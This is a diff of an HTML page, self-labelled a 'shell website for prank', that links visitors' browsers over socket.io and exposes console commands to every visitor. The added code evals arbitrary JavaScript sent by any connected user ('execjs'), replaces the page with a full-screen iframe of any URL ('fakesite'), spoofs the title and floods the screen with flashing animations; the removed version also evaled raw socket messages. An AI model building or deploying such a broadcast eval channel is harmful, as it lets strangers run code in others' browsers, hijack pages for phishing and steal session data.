@@ -4,21 +4,147 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Chun Rapeepat</title>
+    <title>Nothing~</title>
+    <style media="screen">
+      body { margin: 0; overflow: hidden;}
+      .message {
+        position: absolute;
+        font-size: 50px;
+        font-family: sans-serif;
+        top: 40%;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 999999;
+      }
+      .sdog {
+        position: absolute;
+        z-index: 9999;
+        bottom: -10px;
+        left: 0;
+      }
+      .banana {
+        position: absolute;
+        z-index: 9999;
+        bottom: -15px;
+        right: 0;
+        animation-name: banana_dance;
+        animation-duration: 1s;
+        animation-iteration-count: infinite;
+        animation-direction: alternate;
+        animation-timing-function: linear;
+      }
+      .cat {
+        position: absolute;
+        z-index: 999;
+        animation-name: nyan_cat;
+        animation-duration: 0.5s;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+        top: 10%;
+        left: 50%;
+        transform: translateX(-50%);
+      }
+
+      @keyframes nyan_cat {
+        from {
+          transform: scale(0.1);
+        }
+        to {
+          transform: scale(10);
+        }
+      }
+
+      @keyframes banana_dance {
+        from {
+          right: 0;
+        }
+        to {
+          right: 50%;
+        }
+      }
+    </style>
 </head>
 <body>
     <script type="text/javascript" src="/socket.io/socket.io.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
     <script type="text/javascript">
-        var socket = io();
-        socket.on('protocol', (msg) => {
-            eval(msg);
-        });
-        window.send_html_naja = function(html){
-            socket.emit('protocol', 'document.write("'+html+'")')
-        }
-        window.send_js_naja = function(js){
-            socket.emit('protocol', js)
-        }
+        $(document).ready(function(){
+
+          var socket = io();
+
+          socket.on('protocol', (msg) => {
+              if(msg.type === 'execjs') {
+                  eval(msg.payload)
+              }
+              if(msg.type === 'sendmsg'){
+                  $('body').empty()
+                  $('body').append('<div class="message">'+msg.payload+'</h1>')
+              }
+              if(msg.type === 'fakesite'){
+                  $('body').empty()
+                  $('body').append('<iframe src="'+msg.payload+'" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
+              }
+              if(msg.type === 'faketitle'){
+                  document.title = msg.payload
+              }
+              if(msg.type === 'godmode'){
+                  var i = 0, colors = ['red', 'blue', 'green', 'yellow', 'purple', 'pink']
+                  $('body').append('<div style="color: white" class="message">GODDD MODEEEE@!!!</h1>')
+                  $('body').append('<div class="sdog"><img src="https://media.giphy.com/media/TeBpzQZRaBIC4/source.gif"></div>')
+                  $('body').append('<div class="banana"><img src="http://i.imgur.com/s6i6Q.gif"></div>')
+                  $('body').append('<div class="cat"><img src="http://24.media.tumblr.com/8210fd413c5ce209678ef82d65731443/tumblr_mjphnqLpNy1s5jjtzo1_400.gif"/></div>')
+                  setInterval(function(){
+                      document.title = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 50);
+                      document.body.style.backgroundColor = colors[i];
+                      if(i >= colors.length){ i = 0 }else{ i++ }
+                  }, 50)
+              }
+              if(msg.type === 'reset'){
+                  window.location.reload()
+              }
+          });
+
+          function emitmsg(type, payload){
+            socket.emit('protocol', {type: type, payload: payload})
+          }
+
+          window.help = function(){
+            return '\nSHELL WEBSITE FOR PRANK :: HELP MODE\n'
+                   + 'by Chun Rapeepat @chunza2542\n\n'
+                   + '> help()            - Open all commands menu.\n'
+                   + '> execjs(jscode)    - Execute a javascript code.\n'
+                   + '> sendmsg(msg)      - Send a message to the center of the screen.\n'
+                   + '> fakesite(url)     - Send a fake website to the screen by url.\n'
+                   + '> faketitle(name)   - Fake html document.title to whatever you want.\n'
+                   + '> godmode()         - Open godmode.\n'
+                   + '> reset()           - Reset the site screen to blank page.\n\n'
+          }
+
+          window.execjs = function(jscode){
+            emitmsg('execjs', jscode);
+          }
+
+          window.sendmsg = function(msg){
+            emitmsg('sendmsg', msg)
+          }
+
+          window.fakesite = function(url){
+            emitmsg('fakesite', url)
+          }
+
+          window.faketitle = function(name){
+            emitmsg('faketitle', name)
+          }
+
+          window.godmode = function(){
+            emitmsg('godmode', {})
+          }
+
+          window.reset = function(){
+            emitmsg('reset', {})
+          }
+
+        })
     </script>
 </body>
 </html>
